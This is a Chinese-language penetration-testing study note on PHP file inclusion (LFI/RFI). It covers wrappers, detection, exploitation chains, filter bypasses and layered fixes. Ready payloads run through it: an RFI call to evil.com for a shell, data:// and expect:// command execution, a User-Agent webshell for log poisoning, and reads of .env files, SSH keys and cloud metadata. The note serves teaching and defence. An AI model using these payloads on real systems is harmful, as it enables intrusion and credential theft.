# 2026-08-05 文件包含漏洞详解

> 思维导图框架实践笔记 — 从传统 LFI/RFI 到现代利用链

## 知识框架速览

> 🌳 双击展开 / 折叠各级分支

<details open>
<summary><b>📁 文件包含漏洞 — 全文脉络</b></summary>

```
文件包含漏洞
│
├── 🖥️ 脚本/语言
│   ├── PHP（主力）/ JSP / ASPX / Python / JavaWeb
│   └── 现代框架形态
│       ├── Node.js 模板包含
│       ├── Go http.Dir
│       ├── Spring 资源读取
│       ├── Thymeleaf / FreeMarker 模板注入型包含
│       └── Nginx alias 穿越、Tomcat 路径归一化
│
├── 🔍 检测
│   ├── 白盒
│   │   ├── 代码审计
│   │   ├── SAST 工具（Semgrep / CodeQL / Fortify）
│   │   └── AI 辅助审计（LLM 扫危险函数与污点链路）
│   ├── 黑盒
│   │   ├── 公开漏洞
│   │   ├── 手工看参数值及功能点
│   │   └── 参数模糊测试（ffuf / wfuzz）
│   ├── 灰盒 / IAST
│   │   ├── 运行时污点追踪（RASP/IAST 探针）
│   │   └── 差分响应检测
│   └── 供应链维度
│       ├── SCA 组件扫描
│       └── 已知 CVE 匹配
│
├── 📦 类型
│   ├── 本地包含 LFI
│   │   ├── 无限制
│   │   └── 有限制（后缀、路径前缀限制）
│   ├── 远程包含 RFI
│   │   ├── 无限制
│   │   └── 有限制（依赖 allow_url_include）
│   ├── PHP 伪协议（⭐ 现代重点）
│   │   ├── php://filter（任意文件读取 + filter 链构造 RCE）
│   │   ├── data://
│   │   ├── expect://
│   │   ├── zip://
│   │   ├── phar://（触发反序列化）
│   │   └── file:// / http:// / ftp://
│   └── 特殊路径包含
│       ├── /proc/self/environ
│       ├── /proc/self/fd/N
│       ├── session 文件
│       ├── 日志文件
│       └── 临时上传文件
│
├── ⚔️ 利用
│   ├── 经典组合拳
│   │   ├── LFI → 读源码 → 二次审计找 RCE
│   │   ├── LFI + 日志投毒 → RCE
│   │   ├── LFI + Phar 反序列化 → 对象注入链
│   │   ├── LFI + 文件上传（图片马 / zip）→ RCE
│   │   └── LFI + PHP filter 链 → 无文件 RCE
│   ├── 横向扩展
│   │   ├── LFI → SSRF → 云元数据 169.254.169.254
│   │   ├── K8s secrets / 容器环境变量
│   │   ├── 读取 .env / 配置文件 → 凭据泄露
│   │   └── 读取 SSH 私钥 / .git
│   └── AI 时代利用
│       ├── LLM 自动生成 payload 与 filter 链
│       └── 自动化漏洞链编排
│
└── 🛡️ 修复
    ├── 开发层
    │   ├── 固定后缀、固定文件白名单
    │   ├── 路径规范化（realpath / basename 校验）
    │   ├── allow_url_include=Off
    │   └── 限制 php:// 协议
    ├── 运行时
    │   ├── WAF / RASP
    │   ├── 容器/沙箱隔离
    │   ├── 最小权限（Web 进程降权）
    │   └── 敏感文件目录禁止包含
    ├── 管理面
    │   ├── SCA / SAST / DAST 接入 CI/CD 门禁
    │   ├── 组件版本治理
    │   ├── IMDSv2 云元数据防护
    │   └── 密钥轮换
    └── 监控
        ├── 异常参数检测
        ├── 日志投毒痕迹审计
        └── 蜜罐诱捕
```

</details>

---

## 一、原理

### 1.1 什么是文件包含

PHP 等语言提供文件包含函数，让开发者把代码模块化——头部、尾部、配置共用一个文件。但**如果包含哪个文件由用户控制，攻击者就能读任意文件甚至执行任意代码**。

```php
// 正常设计：根据 URL 参数加载不同页面
$file = $_GET['file'];
include($file . '.php');
// ?file=about  → include('about.php') → 显示关于页面 ✅
// ?file=../../etc/passwd → include('../../etc/passwd.php') → 文件不存在？
//   → 如果截断 .php 后缀 → 读到系统密码文件 💥
```

### 1.2 本质

> **用户可以控制 `include()` 的参数 → 服务器以 Web 进程权限读取/执行任意文件。**

`include()` 不只是"读文件"——如果文件里有 `<?php ... ?>`，它会**执行**里面的 PHP 代码。

---

## 二、类型

### 2.1 本地文件包含（LFI）

**只能包含服务器本地的文件。**

| 形态 | 表示 | 说明 |
|------|------|------|
| 无限制 LFI | `?file=../../../etc/passwd` | 路径穿越无阻碍 |
| 后缀限制 | `?file=../../etc/passwd%00` | 后端自动补 `.php`，需截断绕过 |
| 路径前缀限制 | `?file=../../../etc/passwd` | 后端固定加 `/var/www/` 前缀，需足够多 `../` 跳出 |

**高频目标文件**：

| 文件 | 内容价值 |
|------|---------|
| `/etc/passwd` | 验证 LFI 存在（Linux 必读） |
| `/etc/shadow` | 密码哈希（需 root） |
| `C:\Windows\win.ini` | 验证 LFI（Windows） |
| `/var/www/html/config.php` | ⭐ 数据库账号密码 |
| `/.env` | Laravel 等框架的密钥、数据库凭据 |
| `.git/HEAD` | 源码仓库泄露 |
| `/proc/self/environ` | 环境变量（可能含密钥） |
| `/proc/self/fd/N` | 进程打开的文件描述符 |
| `~/.ssh/id_rsa` | SSH 私钥 |
| `/var/log/apache2/access.log` | 日志注入 → 代码执行 |

### 2.2 远程文件包含（RFI）

**包含远程服务器上的文件并执行。**

```
?file=http://evil.com/shell.txt
```

远程文件 `shell.txt` 里的 PHP 代码在目标服务器上执行。

> ⚠️ 前提条件：`php.ini` 中 `allow_url_include=On`（PHP 5.2+ 默认关闭，现代少见，但不能假设一定关着）

### 2.3 PHP 伪协议（⭐ 现代攻击核心）

这是传统框架里容易被忽略但实战中最重要的维度。

| 协议 | 示例 | 作用 |
|------|------|------|
| **`php://filter`** | `php://filter/read=convert.base64-encode/resource=index.php` | ⭐ 读取任意文件源码（Base64 编码防止被 PHP 执行） |
| **`php://filter` 链** | 多个 filter 串联（`iconv` + `base64-decode` 等） | **无文件 RCE**（2024 以来研究热点） |
| **`data://`** | `data://text/plain,<?php system('id');?>` | 直接传 PHP 代码执行 |
| **`phar://`** | `phar://upload/test.jpg/shell.php` | ⭐ 触发反序列化 → 对象注入链 |
| `zip://` | `zip://upload/test.zip%23shell.php` | 包含压缩包内的文件 |
| `expect://` | `expect://whoami` | 直接执行系统命令（需安装 expect 扩展） |
| `file://` | `file:///etc/passwd` | 读取本地文件（和绝对路径效果一样） |
| `http://` / `ftp://` | 远程协议 | RFI |

### 2.4 特殊路径包含

| 路径 | 利用方式 |
|------|---------|
| `/proc/self/environ` | 环境变量中可能含用户可控数据 |
| `/proc/self/fd/N` | 包含进程打开的文件句柄（如临时上传文件） |
| `/tmp/sess_xxx` | Session 文件包含（Session 上传进度 + LFI = RCE） |
| `/var/log/apache2/access.log` | 日志文件包含（日志投毒） |
| `/var/log/auth.log` | SSH 登录日志包含 |
| `/var/mail/www-data` | 邮件日志包含 |

---

## 三、检测方法

### 3.1 白盒检测（代码审计）

**搜索危险函数**：
```
PHP:  include / include_once / require / require_once / file_get_contents
JSP:  <jsp:include> / <%@ include %>
ASPX: <!--#include-->
Python: open() / render_template (模板注入型包含)
Node.js: res.sendFile / fs.readFile
Java:   Thymeleaf / FreeMarker 模板注入
```

**关注参数来源**：函数参数是否直接或间接来自 `$_GET` / `$_POST` / `$_COOKIE` / `$_SERVER`。

**AI 辅助**：用 Semgrep / CodeQL 的污点追踪规则，或 LLM 辅助扫描危险函数与用户输入间的数据流。

**规则示例（Semgrep）**：
```yaml
# 检测用户输入进入 include 的危险模式
rules:
  - id: file-inclusion
    pattern: include($_GET[...]);
    message: "Potential File Inclusion"
```

### 3.2 黑盒检测（手工 + 自动化）

**低成本的标记值探测**：
```
?file=INJECT_TEST_12345  → 看响应有没有区别
?file=/etc/passwd        → 看有没有文件内容回显
?file=../../etc/passwd   → 加层级逃逸
```

**模糊测试工具**：
```
ffuf -w wordlist.txt -u "http://target.com/?file=FUZZ"
wfuzz -c -w wordlist.txt "http://target.com/?file=FUZZ"
```

**差分响应检测**：同一参数注入不同路径（`/etc/passwd` vs `/etc/hosts` vs 不存在的文件），观察响应长度、状态码、报错信息的差异。

### 3.3 常见 LFI 参数名

```
file= / page= / path= / load= / include= / template=
lang= / document= / folder= / style= / pdf= / display=
```

---

## 四、利用 — 从"读文件"到"打穿"

### 4.1 阶段一：确认 LFI 存在

```
?file=/etc/passwd          → 返回 root:x:0:0:root:... ✅ 确认 LFI
?file=C:\Windows\win.ini   → Windows 下确认
```

### 4.2 阶段二：读源码 → 找更多漏洞

```
# 直接读 → 会被 PHP 执行，看不到源码 ❌
?file=index.php

# 用 php://filter 包一层 → Base64 编码后输出，不执行 ✅
?file=php://filter/read=convert.base64-encode/resource=index.php
→ 拿到 Base64 → 解码 → 看到完整源码
→ 源码里可能有：数据库密码、硬编码密钥、其他漏洞点
```

**一字诀——`php://filter` 是 LFI 的必需品，没它你读不到任何 PHP 源码。**

### 4.3 阶段三：拿权限（六条路）

| 路线 | 手法 | 难度 | 条件 |
|------|------|:---:|------|
| **日志投毒** | 把 `<?php ... ?>` 写进 Apache 日志 → LFI 包含日志 | ⭐⭐ | 日志路径已知且可读 |
| **文件上传 + LFI** | 上传图片马 → LFI 包含图片 | ⭐⭐ | 有上传功能 |
| **data:// 伪协议** | `?file=data://text/plain,<?php system('id');?>` | ⭐ | `allow_url_include=On` |
| **Session 包含** | 注册时把恶意数据写进 Session 文件 → LFI 包含 | ⭐⭐⭐ | Session 路径已知 |
| **php://filter 链** | iconv+base64 链构造 RCE | ⭐⭐⭐⭐ | 无文件、无上传的高级手法 |
| **Phar 反序列化** | `phar://upload/test.jpg` → 触发对象反序列化链 | ⭐⭐⭐⭐ | 存在可利用的反序列化 gadget |

#### 日志投毒（最经典）

```
Step 1：用 Burp 截获任何请求，在 User-Agent 里写木马：
   User-Agent: <?php system($_GET['cmd']); ?>

Step 2：这段代码被 Apache 记入 access.log

Step 3：LFI 包含日志：
   ?file=/var/log/apache2/access.log&cmd=whoami
   → 日志被 PHP 执行，system('whoami') 运行 ✅
```

#### php://filter 链（2024 以来热点，了解即可）

```
原理：利用 php://filter 的多个编码转换器串联
（如 iconv 字符集转换 + base64-decode），
在编码/解码过程中"拼出"恶意字符，最终生成 webshell。

关键点：整个过程不依赖上传、不依赖日志，
只靠一条 filter 链从"任意读"升级到"任意写/任意执行"。
```

### 4.4 阶段四：横向扩展

LFI 读到的数据可能通向更大的攻击面：

```
LFI 读 /.env → 拿到 API 密钥、数据库密码 → 数据库/S3 沦陷
LFI 读 config.php → 数据库凭据 → 登录数据库 → 写 webshell
LFI 读 SSH 私钥 → 直接 SSH 登录服务器
LFI 读 /proc/self/environ → 云环境凭据

LFI → SSRF（利用 http:// 伪协议）：
   ?file=http://169.254.169.254/latest/meta-data/ → 读云元数据
   ?file=http://kubernetes.default.svc/ → K8s API
```

---

## 五、绕过手法

### 5.1 后缀绕过

```php
// 后端代码强制加 .php
include($_GET['file'] . '.php');
```

| 绕过方式 | Payload | 说明 |
|----------|---------|------|
| **%00 截断** | `?file=../../etc/passwd%00` | PHP < 5.3.4，空字节截断后面内容 |
| **路径长度截断** | `?file=../../etc/passwd/./././....` | PHP < 5.2.8，路径超 4096 字符自动截断 |
| **问号截断** | `?file=../../etc/passwd?` | 某些环境下 `?` 后变查询参数 |
| **# 号截断** | `?file=../../etc/passwd%23` | `#` 后变锚点 |

### 5.2 路径过滤绕过

```
过滤了 ../ ？
→ ....//....//etc/passwd  （删掉 ../ 后 → ../../etc/passwd）
→ 用绝对路径：/etc/passwd

过滤了 / ？
→ 用 ..\..\etc\passwd（Windows）

固定前缀 /var/www/ ？
→ ?file=../../../etc/passwd（越狱出去）
```

### 5.3 关键词过滤绕过

```
过滤了 php:// ？
→ PHP://filter/...  （大写）

过滤了 base64 ？
→ 换别的编码：rot13 / string.toupper 等

过滤了 data:// ？
→ data://text/plain;base64,PD9waHAgcGhwaW5mbygpOz8+
```

---

## 六、安全修复

### 6.1 开发层（核心防线）

```php
// ✅ 白名单——只允许特定文件
$allowed = ['about', 'contact', 'home'];
if (!in_array($_GET['file'], $allowed)) {
    die('Access Denied');
}
include($_GET['file'] . '.php');

// ✅ Switch 硬映射（更严格）
switch ($_GET['page']) {
    case 'about': include('about.php'); break;
    case 'contact': include('contact.php'); break;
    default: include('home.php');
}
// 攻击者完全无法控制 include 的参数
```

```php
// ✅ 路径规范化 + 白名单目录
$file = realpath('/var/www/pages/' . $_GET['file'] . '.php');
if (strpos($file, '/var/www/pages/') !== 0) {
    die('Access Denied');  // 不在允许目录下
}
include($file);
```

### 6.2 配置层

```ini
; php.ini 安全配置
allow_url_fopen = Off       ; 禁止远程文件操作
allow_url_include = Off     ; ⭐ 禁止远程文件包含（关键）
open_basedir = /var/www/html ; 限制 PHP 能读的目录范围
disable_functions = system,exec,passthru,shell_exec  ; 禁用危险函数
```

### 6.3 运行时防护

| 层面 | 措施 |
|------|------|
| **WAF** | 拦截 `../` `php://` `data://` `http://` 等危险参数 |
| **RASP** | 运行时检测 `include()` 的参数是否异常 |
| **容器隔离** | Web 容器只读权限，敏感目录映射隔离 |
| **最小权限** | Web 进程用户（`www-data`）不能读 `/etc/shadow`、SSH 私钥等 |
| **云环境** | 元数据服务用 IMDSv2，禁止通过简单 GET 获取凭据 |

### 6.4 CI/CD 门禁

```
SAST（Semgrep/CodeQL）→ 扫描 include 等危险函数的参数来源
SCA（依赖扫描）→ 第三方组件的文件包含 CVE
DAST（动态测试）→ 自动化 LFI/RFI Payload 测试
全部接入 CI pipeline → 合代码前必须通过
```

### 6.5 防御分层

```
第 1 层：代码白名单 — 不接受用户输入拼进 include
第 2 层：php.ini 配置 — allow_url_include=Off + open_basedir
第 3 层：WAF/RASP — 拦截攻击 Payload
第 4 层：系统权限 — Web 进程只读必要目录
第 5 层：CI/CD 门禁 — 代码合入前扫描
```

---

## 七、2024-2026 演进趋势

### 7.1 LFI 的角色变了

> **传统视角**：LFI → 读 passwd → 结束。  
> **现代视角**：LFI 是攻击链的入口，读完文件后串联 SSRF、反序列化、凭据窃取，影响放大数倍。

### 7.2 PHP filter 链

2024 年以来的研究热点。不需要上传文件、不需要日志投毒——一条精密的 `php://filter` 链（`iconv` + `base64-decode` 等组合）就能把"任意文件读取"变成"代码执行"。防护重点是**限制 `php://` 协议的使用**，而不仅仅是防路径穿越。

### 7.3 AI 对攻防双方的影响

| 攻击侧 | 防护侧 |
|--------|--------|
| LLM 自动生成 Payload 和 filter 链 | AI 辅助代码审计，检出率大幅提升 |
| 自动编排漏洞利用链 | SAST+SCA 接入 CI/CD 门禁 |
| 批量识别 LFI 参数 | 运行时 RASP 污点追踪 |

### 7.4 云原生下的新目标

```
传统：LFI → /etc/passwd
现在：LFI → /.env → 云密钥
      LFI → /proc/self/environ → K8s secrets
      LFI → http://169.254.169.254/ → 云元数据 → 临时凭证
```

---

## 八、总结

| 维度 | 核心认知 |
|------|---------|
| **原理** | `include()` 的参数受用户控制 → 读任意文件 / 执行任意代码 |
| **分类** | LFI（本地）/ RFI（远程）/ 伪协议（`php://filter` `phar://` `data://`） |
| **检测** | 白盒搜危险函数 + 黑盒测路径穿越 + 调参差分响应 |
| **利用** | 读文件 → 读源码 → 拿权限（日志投毒/图片马/data:///filter 链）→ 横向打 SSRF/云元数据 |
| **绕过** | 双写 `....//`、`%00` 截断、`?` `#` 截断、大小写、编码 |
| **防御** | 白名单映射文件（不拼用户输入）+ `allow_url_include=Off` + WAF + 最小权限 |

### 关联笔记

- [CSRF 与 SSRF 漏洞详解](./2026-08-04-CSRF与SSRF漏洞详解.md) — LFI + SSRF 组合打云元数据
- [文件上传漏洞体系总览](./2026-07-31-文件上传漏洞.md) — 文件上传 + LFI getshell
- [文件上传 WAF 绕过与防御](./2026-08-02-文件上传WAF绕过与防御.md) — 绕过思路同源
- [XSS WAF 绕过与安全修复](./2026-08-04-XSS-WAF绕过与安全修复.md) — 防御多层体系可对照

### 待实践

- [ ] Pikachu 文件包含关卡通（Local + Remote）
- [ ] 日志投毒手动复现：User-Agent 写马 → LFI 包含日志 → RCE
- [ ] `php://filter` 读源码实践
- [ ] 搭建 DVWA 文件包含关卡（Low → Impossible 逐级看防御差异）

> ⚠️ 声明：以上技术仅用于授权靶场和渗透测试授权目标，未经授权使用属于违法行为。
